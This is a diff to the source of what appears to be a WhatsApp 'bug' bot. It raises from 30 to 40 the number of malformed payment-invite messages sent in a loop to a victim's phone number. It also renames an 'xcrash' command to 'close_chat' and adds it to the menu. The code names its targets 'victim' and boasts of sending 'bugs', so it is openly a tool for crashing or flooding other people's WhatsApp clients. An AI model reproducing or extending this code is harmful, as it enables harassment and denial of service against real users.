@@ -2027,7 +2027,7 @@ case 'grey_ios':
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 234xxxxxxxxx`)
  victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
+amount = "40"
 for (let i = 0; i < amount; i++) {
 XeonBotInc.relayMessage(victim,{ 
 "paymentInviteMessage": {
@@ -2053,7 +2053,7 @@ await sleep(3000)
 replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
 }
 break
-case 'xcrash':{
+case 'close_chat':{
 if (!isPremium) return replygcxeon(mess.prem)
  if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 234xxxxxxxxxx`)
  victim = text.split("|")[0]+'@s.whatsapp.net'
@@ -2421,6 +2421,7 @@ ${readmore}
 ◈ sᴏʟᴏ-ɴᴇᴛ <ɴᴜᴍʙᴇʀ>
 ◈sᴏʟᴏ-ɢᴄ <ɢᴄ ʟɪɴᴋ|>
 ◈sᴏʟᴏ_0 <ᴀᴍᴏᴜɴᴛ> ɪɴ ᴄʜᴀᴛ !
+◈ᴄʟᴏsᴇ_ᴄʜᴀᴛ <ᴀᴍᴏᴜɴᴛ> ɪɴ ᴄʜᴀᴛ !
 ┗━━━━━━━━━━━
      ɪɴ ᴄʜᴀᴛ/ɢᴄ -ɪᴏs
 ┏━━━━━━━━━━━
